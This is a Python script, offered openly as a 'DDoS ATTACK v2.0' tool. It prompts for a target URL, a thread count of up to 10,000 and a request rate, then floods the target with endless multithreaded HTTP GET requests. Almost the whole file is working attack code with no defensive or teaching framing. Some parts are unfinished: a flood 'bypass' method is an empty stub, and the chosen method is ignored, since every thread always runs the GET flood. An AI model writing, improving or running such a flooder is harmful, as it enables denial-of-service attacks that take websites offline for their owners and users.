import requests
import threading
import time
import sys
from datetime import datetime

print('''
       ________________
      /                \
     / DDoS ATTACK v2.0\
     \_________________\
      |     _________   |
      |    /       /    |
      |   /     @ @     |
      |   \   ____ /     |
      |    \______/      |
      |    ____ ___       |
      |   / ____/ _/      |
      |   \__ _/         |
      |    ___\ /          |
      |   /    \_\         |
      |                    |
''')


sys.setrecursionlimit(10000) # Increase the recursion limit

class DDoS:
    def __init__(self, url, method='GET', pps=100):
        self.url = url
        self.method = method
        self.pps = pps # Packets per second

    def attack(self):
        while True:
            try:
                if self.method == 'POST':
                    requests.post(self.url)
                elif self.method == 'GET':
                    requests.get(self.url)
                elif self.method == 'HEAD':
                    requests.head(self.url)
                elif self.method == 'flood_get':
                    self.flood_get()
                elif self.method == 'bypass':
                    self.flood_bypass()
                else:
                    print("Method not supported.")
                    return
                parse(self, requests.get(self.url))
                time.sleep(1/self.pps) # Sleep time depends on pps
            except requests.exceptions.RequestException as e:
                print('Error:', e)

    def flood_bypass(self):
        # Implement your flood bypass logic here
        pass

    def flood_get(self):
        while True:
            try:
                response = requests.get(self.url)
                parse(self, response)
                time.sleep(1/self.pps) # Sleep time depends on pps
            except requests.exceptions.RequestException as e:
                print('Error:', e)

def parse(self, response):
    current_time = datetime.now().strftime("%H:%M:%S")
    print(f'{current_time} DDoS Attack: {response.url}')

def main():
    target_url = input('Enter Target URL: ')
    method = input('Enter Method (GET/POST/HEAD/flood_get): ')
    number_of_threads = int(input('Enter Number of Threads: '))
    pps = int(input('Enter Packets per Second: '))

    if number_of_threads > 10000:
        print("Error: Maximum 10000 threads allowed.")
        return

    if pps > 10000:
        print("Error: Maximum 10000 PPS allowed.")
        return

    ddos = DDoS(target_url, method, pps)

    threads = []
    for _ in range(number_of_threads):
        thread = threading.Thread(target=ddos.flood_get)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == '__main__':
    main()